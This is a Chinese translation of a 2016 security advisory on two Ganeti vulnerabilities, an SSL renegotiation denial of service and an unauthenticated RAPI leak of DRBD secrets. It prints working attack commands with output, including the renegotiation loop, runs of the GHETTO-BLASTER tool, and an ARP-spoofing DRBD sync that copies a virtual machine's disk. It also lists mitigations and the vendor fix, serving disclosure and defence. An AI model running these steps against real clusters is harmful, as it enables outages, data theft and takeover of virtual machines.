# Ganeti漏洞允许攻击者远程接管虚拟机

阅读量 **109804**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-01-05 13:57:56

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html>

译文仅供参考，具体内容表达以及含义原文为准。

**产品描述**

[Ganeti](https://code.google.com/p/ganeti/)是一款由谷歌公司开发的虚拟机集群管理工具。这是一款基于Xen虚拟机管理器和其他开源软件的虚拟服务器管理软件。

该解决方案使用了Xen或KVM作为虚拟化平台，将LVM工具用于磁盘管理，将磁盘的存储内容在物理主机之间进行拷贝时，可以选用DRDB方案。

除此之外，该平台为管理实例提供了下面的一些功能：

| 支持Xen虚拟化技术

| 最高支持1-25个物理节点（一个CPU在一个Cluster架构下，就称为一个node）

| 提供导入和导出架构用以备份或在计算机集群中进行迁移

但值得注意的是，Ganeti不提供数据在线迁移的支持。

**漏洞信息概览**

即使Ganeti看起来安全等级非常的高，但在默认配置下（部署了DRBD）安装的Ganeti中仍然存在不少安全问题。这是因为在默认配置下，Ganeti中老版本的代码库以及该软件的设计机制存在缺陷。

除了最新发布的版本之外，其他所有的Ganeti版本中都存在这些安全问题。

默认配置下，Ganeti API守护进程对每一个接口都是开放的，这样一来，攻击者就可以对这些守护进程进行攻击了。

当然了，攻击者同样可以利用这些守护进程来获取目标系统中的信息，例如网络拓扑，DRBD，以及其他的机密信息…

我们在文章结尾还提供了一个PoC（概念验证）视频，我们将会在演示视频中演示如何利用这一漏洞来自动获取敏感信息，在可能的情况下，这一漏洞还可以允许攻击者远程接管虚拟机。整个概念验证过程都是在我实验室中特定的条件下进行的。

**CVE-2015-7944（未经验证的远程拒绝服务漏洞）的详细信息**

在RAPI守护进程与SSL层进行协议处理的过程中，Ganeti极易受到SSL拒绝服务攻击：

    
    
    user@kali:~$ (sleep 1; while true;do echo R;done) | openssl s_client -connect 10.105.1.200:5080
    CONNECTED(00000003)
    depth=0 CN = ganeti.example.com
    verify error:num=18:self signed certificate
    verify return:1
    depth=0 CN = ganeti.example.com
    verify return:1
    ---    Certificate chain
     0 s:/CN=ganeti.example.com
       i:/CN=ganeti.example.com
    ---    Server certificate
    -----BEGIN CERTIFICATE-----    [...]
    -----END CERTIFICATE-----    subject=/CN=ganeti.example.com
    issuer=/CN=ganeti.example.com
    ---    No client certificate CA names sent
    ---    SSL handshake has read 1003 bytes and written 625 bytes
    ---    New, TLSv1/SSLv3, Cipher is AES256-GCM-SHA384
    Server public key is 2048 bit
    Secure Renegotiation IS supported
    Compression: NONE
    Expansion: NONE
    SSL-Session:
        Protocol  : TLSv1.2
        Cipher    : AES256-GCM-SHA384
        Session-ID: D75BCF369143CD008D693B022B967149AF0BD420DE385C51227A1921CD29360D
        Session-ID-ctx: 
        Master-Key: 7DDD57FD479AE6555D1D42CF2B15B8857C28430189EC5C1331C75C4253E4A9F0FC0672EE2F2438CD055328C5A46C4F5F
        Key-Arg   : None
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        TLS session ticket lifetime hint: 300 (seconds)
        TLS session ticket:
        0000 - 10 ad 69 39 76 6c 2e 37-cf e7 c2 2c 5f f0 e0 20   ..i9vl.7...,_.. 
        0010 - 5d 85 5a 79 82 20 6a 1d-f1 6e 51 f5 f2 f7 c6 cf   ].Zy. j..nQ.....
        0020 - c1 85 2d 42 5a 1c 53 b4-cb db de 65 04 2a 02 da   ..-BZ.S....e.*..
        0030 - 5c 7d 82 ef 56 4a a4 a1-88 bd 87 fd af 25 e3 2e   }..VJ.......%..
        0040 - 28 68 04 a4 01 22 88 72-30 0b 79 1c 75 61 88 d5   (h...".r0.y.ua..
        0050 - c9 f3 e2 0b 02 50 bf c8-29 ac d9 36 f3 76 bd 8b   .....P..)..6.v..
        0060 - 05 e0 d3 a9 f3 8b 8b 11-ef 19 2f 94 92 30 94 58   ........../..0.X
        0070 - aa 64 ba 3f a4 fc 15 4b-74 11 3b c3 c7 e7 d4 33   .d.?...Kt.;....3
        0080 - dd 76 e9 e1 1b 3a 95 c4-50 28 4f 9e bc cc cb f3   .v...:..P(O.....
        0090 - bf 4d 60 92 64 00 af 67-c0 e9 69 e3 98 54 21 dc   .M`.d..g..i..T!.
        Start Time: 1138121399
        Timeout   : 300 (sec)
        Verify return code: 18 (self signed certificate)
    ---    RENEGOTIATING
    depth=0 CN = ganeti.example.com
    verify error:num=18:self signed certificate
    verify return:1
    depth=0 CN = ganeti.example.com
    verify return:1
    RENEGOTIATING
    depth=0 CN = ganeti.example.com
    verify error:num=18:self signed certificate
    verify return:1
    depth=0 CN = ganeti.example.com
    verify return:1
    RENEGOTIATING
    depth=0 CN = ganeti.example.com
    verify error:num=18:self signed certificate
    verify return:1
    depth=0 CN = ganeti.example.com
    verify return:1
    RENEGOTIATING
    [...]

在我的测试过程中，一个线程就占用了75%的CPU资源。

在主服务器中(10.105.1.200)的top:

    
    
    19734 gnt-rapi  20   0  148980  35364   4696 R  76.8  3.7   0:04.12 ganeti-rapi

多线程将会占用掉CPU全部的资源，这样就可以对Ganeti进行拒绝服务（DoS）攻击了：

    
    
    21280 gnt-rapi  20   0  148980  35364   4696 R  35.3  3.7   0:05.06 ganeti-rapi
    20968 gnt-rapi  20   0  148980  35364   4696 R  33.4  3.7   0:09.92 ganeti-rapi
    20969 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:09.95 ganeti-rapi
    21282 gnt-rapi  20   0  148980  35364   4696 R  32.4  3.7   0:04.53 ganeti-rapi
    21281 gnt-rapi  20   0  148980  35364   4696 R  31.4  3.7   0:04.78 ganeti-rapi

除此之外，攻击者还可以使用THC网站所提供的工具来进行SSL拒绝服务攻击（openssl是效率最好的解决方案）：[https://www.thc.org/thc-ssl-dos/](https://www.thc.org/thc-ssl-dos/)

**CVE-2015-7945（未经验证的远程信息披露）的详细信息**

这个漏洞允许攻击者使用信息披露来获取数据，根据系统的配置，还可以远程入侵虚拟机系统。点击下列地址获取概念验证示例（GHETTO-BLASTER可以在Linux（包括Debian和Kali在内）和FreeBSD中运行）：

[https://pierrekim.github.io/advisories/GHETTO-BLASTER](https://pierrekim.github.io/advisories/GHETTO-BLASTER)

**1\. 针对RAPI守护进程来设计安全漏洞**

在Ganeti的主节点中，当我们使用/usr/sbin/gnt-network命令时，非root用户是无法得到信息的（debian-01为Ganeti主节点）：

    
    
    user@debian-01:~$ /usr/sbin/gnt-network list
    It seems you don't have permissions to connect to the master daemon.
    Please retry as a different user.
    user@debian-01:~$

在使用gnt-tools命令时，这种情况是很常见的，这似乎是一种安全机制。

似乎Ganeti在默认配置下会自动启用RAPI守护进程，并且该守护进程还会对每一个接口进行监听。

比如说，我们可以在没有经过身份验证的情况下，通过RAPI守护进程从系统中提取出网络配置信息。

为了实现这一处理过程，我编写了一个工具，即“GHETTO-BLASTER”：

    
    
    user@kali:~$ ./GHETTO-BLASTER http://<ip_of_ganeti_rapi>
    Example:
      https://<ip>
    2015 Pierre Kim <pierre.kim.sec@gmail.com>
         @PierreKimSec https://pierrekim.github.io
    DO WHAT THE FUCK YOU WANT TO PUBLIC LICENSE <http://www.wtfpl.net/txt/copying/>
    user@kali:~$ ./GHETTO-BLASTER http://10.105.1.200
    [...]
    [a lot of output]
    [...]
    user@kali:~$ ls -l 2-networks  2-networks-test-priv 2-networks-test-pub
    -rw-r--r-- 1 user user 228 Jun 20 13:37 2-networks
    -rw-r--r-- 1 user user 882 Jun 20 13:37 2-networks-test-priv
    -rw-r--r-- 1 user user 881 Jun 20 13:37 2-networks-test-pub
    user@kali:~$ cat 2-networks  2-networks-test-priv 2-networks-test-pub
    $VAR1 = [
              {
                'name' => 'test-priv',
                'uri' => '/2/networks/test-priv'
              },
              {
                'uri' => '/2/networks/test-pub',
                'name' => 'test-pub'
              }
            ];
    $VAR1 = {
              'mtime' => '1313027652.67126',
              'gateway' => undef,
              'network6' => undef,
              'inst_list' => [],
              'mac_prefix' => undef,
              'serial_no' => 1,
              'free_count' => 254,
              'name' => 'test-priv',
              'map' => 'X..............................................................................................................................................................................................................................................................X',
              'gateway6' => undef,
              'external_reservations' => '192.168.1.0, 192.168.1.255',
              'uuid' => '506ad97b-2276-43f4-ae27-e6bbb97f28ff',
              'ctime' => '1133027652.67126',
              'reserved_count' => 2,
              'network' => '192.168.1.0/24',
              'group_list' => [],
              'tags' => []
            };
    $VAR1 = {
              'mac_prefix' => undef,
              'inst_list' => [],
              'network6' => undef,
              'mtime' => '1333027641.64375',
              'gateway' => undef,
              'map' => 'X..............................................................................................................................................................................................................................................................X',
              'free_count' => 254,
              'name' => 'test-pub',
              'serial_no' => 1,
              'reserved_count' => 2,
              'network' => '192.168.0.0/24',
              'ctime' => '1133027641.64375',
              'gateway6' => undef,
              'uuid' => '48b34199-2d23-46f0-b4aa-2539cb4a7780',
              'external_reservations' => '192.168.0.0, 192.168.0.255',
              'group_list' => [],
              'tags' => []
            };
    user@kali:~$

现在，我们也许就可以映射出目标网络的拓扑结构，并且从中获取敏感的机密信息了。

另一个非常有意思的信息：

在访问RAPI守护进程的作业中，osparams_secret是可读的。

**2\. 使用这种信息披露功能来入侵虚拟机系统**

默认配置下，/var/lib/ganeti/config.data(640, gnt-masterd:gnt-confd)中包含有DRBD拷贝功能所需的密钥。

远程用户或者是本地非root用户（或者非gnt-masterd用户）是无法得到DRBD的配置文件的。

在我们对RAPI守护进程进行操作的过程中，这个密钥是可以在未经身份验证的情况下从作业中提取出来的。

在运行了GHETTO-BLASTER之后，你将会得到大量的文件：

    
    
    user@kali:~$ ls
    1-list-collectors      2-jobs-121  2-jobs-154  2-jobs-187  2-jobs-219  2-jobs-251  2-jobs-284  2-jobs-47  2-jobs-8
    1-report-all           2-jobs-122  2-jobs-155  2-jobs-188  2-jobs-22   2-jobs-252  2-jobs-285  2-jobs-48  2-jobs-80
    2-features             2-jobs-123  2-jobs-156  2-jobs-189  2-jobs-220  2-jobs-253  2-jobs-286  2-jobs-49  2-jobs-81
    2-info                 2-jobs-124  2-jobs-157  2-jobs-19   2-jobs-221  2-jobs-254  2-jobs-287  2-jobs-5   2-jobs-82
    2-instances            2-jobs-125  2-jobs-158  2-jobs-190  2-jobs-222  2-jobs-255  2-jobs-288  2-jobs-50  2-jobs-83
    2-instances-vm-01      2-jobs-126  2-jobs-159  2-jobs-191  2-jobs-223  2-jobs-256  2-jobs-289  2-jobs-51  2-jobs-84
    2-instances-vm-01-jobs 2-jobs-127  2-jobs-16   2-jobs-192  2-jobs-224  2-jobs-257  2-jobs-29   2-jobs-52  2-jobs-85
    2-instances-vm-02      2-jobs-128  2-jobs-160  2-jobs-193  2-jobs-225  2-jobs-258  2-jobs-290  2-jobs-53  2-jobs-86
    2-instances-vm-02-jobs 2-jobs-129  2-jobs-161  2-jobs-194  2-jobs-226  2-jobs-259  2-jobs-291  2-jobs-54  2-jobs-87
    [...]
    2-jobs-109             2-jobs-141  2-jobs-174  2-jobs-206  2-jobs-239  2-jobs-271  2-jobs-34   2-jobs-67  2-networks
    2-jobs-11              2-jobs-142  2-jobs-175  2-jobs-207  2-jobs-24   2-jobs-272  2-jobs-35   2-jobs-68  2-nodes
    2-jobs-110             2-jobs-143  2-jobs-176  2-jobs-208  2-jobs-240  2-jobs-273  2-jobs-36   2-jobs-69  2-nodes-debian-01
    2-jobs-111             2-jobs-144  2-jobs-177  2-jobs-209  2-jobs-241  2-jobs-274  2-jobs-37   2-jobs-7   2-nodes-debian-01-role
    2-jobs-112             2-jobs-145  2-jobs-178  2-jobs-21   2-jobs-242  2-jobs-275  2-jobs-38   2-jobs-70  2-nodes-debian-02
    2-jobs-113             2-jobs-146  2-jobs-179  2-jobs-210  2-jobs-243  2-jobs-276  2-jobs-39   2-jobs-71  2-nodes-debian-02-role
    2-jobs-114             2-jobs-147  2-jobs-18   2-jobs-211  2-jobs-244  2-jobs-277  2-jobs-4    2-jobs-72  2-os
    2-jobs-115             2-jobs-148  2-jobs-180  2-jobs-212  2-jobs-245  2-jobs-278  2-jobs-40   2-jobs-73  version
    2-jobs-116             2-jobs-149  2-jobs-181  2-jobs-213  2-jobs-246  2-jobs-279  2-jobs-41   2-jobs-74
    2-jobs-117             2-jobs-15   2-jobs-182  2-jobs-214  2-jobs-247  2-jobs-28   2-jobs-42   2-jobs-75
    2-jobs-118             2-jobs-150  2-jobs-183  2-jobs-215  2-jobs-248  2-jobs-280  2-jobs-43   2-jobs-76
    2-jobs-119             2-jobs-151  2-jobs-184  2-jobs-216  2-jobs-249  2-jobs-281  2-jobs-44   2-jobs-77
    2-jobs-12              2-jobs-152  2-jobs-185  2-jobs-217  2-jobs-25   2-jobs-282  2-jobs-45   2-jobs-78
    2-jobs-120             2-jobs-153  2-jobs-186  2-jobs-218  2-jobs-250  2-jobs-283  2-jobs-46   2-jobs-79

在这些文件中，有的文件含有DRBD的密钥信息：

    
    
    user@kali:~$ grep secret *|tail -n 5
    2-jobs-80:                                        'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
    2-jobs-82:                            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06'
    2-jobs-84:                            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
    2-jobs-85:                            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
    2-jobs-86:                            'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
    user@kali:~$

我们可以在Ganeti主节点中，以root用户的身份运行drbdsetup show命令来对获取到的密钥进行对比和确认：

    
    
    root@debian-01:~# drbdsetup show
    resource resource0 {
        options {
        }
        net {
            cram-hmac-alg           "md5";
            shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
            after-sb-0pri           discard-zero-changes;
            after-sb-1pri           consensus;
        }
        _remote_host {
            address                 ipv4 10.105.1.201:11000;
        }
        _this_host {
            address                 ipv4 10.105.1.200:11000;
            volume 0 {
                device                      minor 0;
                disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
                meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
                disk {
                    size                    8388608s; # bytes
                    resync-rate             61440k; # bytes/second
                }
           }
        }
    }
    root@debian-01:~#

在对这些数据进行进一步的分析之后，我们发现，其中有一个作业文件包含有DRBD配置信息：

    
    
    [...]
      'drbd_info' => {
                       'port' => 11000,
                       'primary_minor' => 0,
                       'secondary_node' => 'debian-02',
                       'secondary_minor' => 0,
                       'secret' => 'eb1fe92b20aef58ed0570df49a38f82cf5a72d06',
                       'primary_node' => 'debian-01'
                     },
    [...]

如果你想了解更多有关这一部分的信息，请点击下列地址进行查看：[http://docs.ganeti.org/ganeti/current/html/security.html](http://docs.ganeti.org/ganeti/current/html/security.html)

现在，我们已经在未经身份验证的情况下成功地恢复了DRBD的密钥，其使用的端口，以及相应节点了。除此之外，还有一些其他的文件，这些文件还有VLM
VG以及LVM VG名称！这些信息已经足够我们使用了，现在就让我们从一名攻击者的角度来利用这些信息，看看我们到底能对DRBD做些什么吧！

**3．DRBD悲剧了**

得到虚拟机的文件系统信息：

对同一局域网进行ARP欺骗：

通过ARP欺骗，我们可以将自己的IP地址伪装成10.105.1.201，并且还有一个有效的drbd.conf配置文件可供使用（多亏了RAPI守护进程所提供的配置参数）：

    
    
    root@kali# cat etc-drbd.conf
    include "drbd.d/global_common.conf";
    include "drbd.d/*.res";
    resource resource0 {
        volume 0 {
           device minor 0;
           disk                        "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data";
           meta-disk                   "/dev/xenvg-vg/41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta";
        }
        protocol C;
        net {
            cram-hmac-alg           "md5";
            shared-secret           "eb1fe92b20aef58ed0570df49a38f82cf5a72d06";
            after-sb-0pri           discard-zero-changes;
            after-sb-1pri           consensus;
        }
        on target {
            address    10.105.1.200:11000;
        }
        on kali {
            address    10.105.1.201:11000;
        }
    }
    root@kali# vgremove xenvg-vg 2>/dev/null
    root@kali# dd if=/dev/zero of=/dev/sdb bs=1024 count=1024
    root@kali# pvcreate /dev/sdb
    root@kali# vgcreate xenvg-vg /dev/sdb
    root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_data --size 4G xenvg-vg
    root@kali# lvcreate --name 41975138-516e-4f8d-9c39-f6716a89efa2.disk0_meta --size 128M xenvg-vg
    root@kali# cp etc-drbd.conf /etc/drbd.conf
    root@kali# drbdadm create-md resource0
    root@kali# drbdadm up resource0
    <ARP poisoning> || root@kali# ifconfig eth0 10.105.1.201 netmask 255.255.255.0
    root@kali# drbdadm attach resource0
    root@kali# drbdadm connect resource0
    root@kali# cat /proc/drbd
    version: 8.4.3 (api:1/proto:86-101)
    srcversion: 1A9F77B1CA5FF92235C2213 
     0: cs:SyncTarget ro:Secondary/Primary ds:Inconsistent/UpToDate C r-----        ns:0 nr:916568 dw:916472 dr:0 al:0 bm:55 lo:2 pe:0 ua:2 ap:0 ep:1 wo:f oos:3277832
            [===>................] sync'ed: 22.0% (3277832/4194304)K
            finish: 0:08:33 speed: 6,368 (5,912) want: 4,520 K/sec
    root@kali# echo "wow synchronisation in progress !"
    wow synchronisation in progress !
    root@kali#

经过十分钟的同步处理之后，攻击者就可以使用DRBD拷贝功能得到目标虚拟机文件系统中的所有文件拷贝了。

当然了，攻击者也可以向文件系统中写入信息（例如添加SSH密钥）。通过添加ssh密钥，并运行s/PermitRootLogin
No/PermitRootLogin Yes/命令，就可以对虚拟机进行root，这一部分将作为练习留给读者自行摸索。

实现中间人攻击的其它方法也将作为练习，留给读者自行学习和摸索。

**安全研究专家提出的解决方案**

首先，我认为为了提高Ganeti的安全性，以下这些步骤是必须要完成的：

1/强制RAPI守护进程监听127.0.0.1，而不是监听0.0.0.0。

我们可以在/etc/default/ganeti目录中向配置文件添加下列代码来实现：

RAPI_ARGS="-b 127.0.0.1"

2/为RAPI守护进程添加身份验证功能（不仅对文件系统进行写操作时需要进行身份验证，对系统进行读操作时同样需要进行身份验证）。

3/对进程作业的输出数据进行过滤，以防止其泄漏密钥等敏感数据。

请注意，用户需要立即采取的措施就是更换DRBD当前所使用的密钥，并且确认当前没有人正在访问DRBD数据块。

4/禁用SSL协商，并更新系统的初始密码。

我个人认为：由于部署一个能够正常工作的Ganeti平台是非常复杂的，攻击者如果在此之前没有对Ganeti平台进行深入的研究和学习，那么他肯定会放弃对你的平台进行攻击
🙂

**供应商对此事的回应**

将Ganeti升级到最新版本。

如果用户需要了解具体的缓解方案，请访问下列地址：

[https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg](https://groups.google.com/forum/%23!topic/ganeti/9bLyzwmmvdg)

**漏洞发现者**

这些漏洞是由Pierre Kim（[@PierreKimSec](https://twitter.com/PierreKimSec)）发现的。

**致谢**

非常感谢我的朋友Alexandre Torres，Jordan， Jerome以及Stephen给我提供的帮助。

感谢谷歌安全团队，感谢他们在解决这一问题的过程中所作出的努力。

**参考文档**

[https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt](https://pierrekim.github.io/advisories/2016-ganeti-0x00.txt)

[https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html](https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html)

[http://www.ocert.org/advisories/ocert-2015-012.html](http://www.ocert.org/advisories/ocert-2015-012.html)

[https://groups.google.com/forum/#!topic/ganeti/9bLyzwmmvdg](https://groups.google.com/forum/%23!topic/ganeti/9bLyzwmmvdg)

**PoC－GHETTO-BLASTER**

概念验证示例可以从下列地址中获取：

[https://pierrekim.github.io/advisories/GHETTO-BLASTER](https://pierrekim.github.io/advisories/GHETTO-BLASTER)

本文翻译自360安全播报 [原文链接](https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **WisFree** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83238](/post/id/83238)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html)

如若转载,请注明出处： <https://pierrekim.github.io/blog/2016-01-05-Ganeti-Info-Leak-DoS.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhimg.com/t014c3fa13dce6c85dd.png) WisFree

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

